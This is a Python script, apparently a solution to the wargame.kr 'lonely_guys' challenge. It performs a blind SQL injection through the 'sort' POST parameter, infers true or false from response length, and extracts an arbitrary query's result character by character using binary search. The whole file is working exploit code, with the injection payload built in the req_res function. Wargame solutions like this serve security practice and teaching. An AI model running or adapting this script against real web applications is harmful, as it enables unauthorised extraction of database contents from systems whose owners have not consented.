import urllib.request, urllib.parse
import sys, math
import re
def check_true(res) :
    return (len(res) >= 1450)

def req_res(query):
#    print(query)
    url = 'http://wargame.kr:8080/lonely_guys/index.php'
    data = urllib.parse.urlencode({'sort' : ',(select 1 from information_schema.tables where if((' + query + '), 0, 1))'}).encode()
    req = urllib.request.Request(url,data = data)
    res = urllib.request.urlopen(req)
    output = res.read()
    return check_true(output)

def check_greater_than(query, val):
    return req_res(query + '>=' + str(val))

def find_char(query):
    first = 0
    end = 129
    
    while first < end -1:
        mid = math.floor((first + end) / 2)

        if check_greater_than(query, mid):
            first = mid
        else:
            end = mid
    return chr(first)
def get_content(query):
    query = f'({query})'
    content_len = 40
    content = ''

    for idx in range(1, content_len + 1):
        content += find_char('ascii(substr(' + query + ', ' + str(idx) + ', 1))')
        sys.stdout.write('\r[40] ' + content + '_' * int(content_len  - len(content)))

    print()
    return content
if __name__ == '__main__':
    if len(sys.argv) < 2:
        print('Using: ' + sys.argv[0] + ' <cmd>\n')
        exit()
    content = get_content(' '.join(sys.argv[1:]))

#posix.tistory.com/19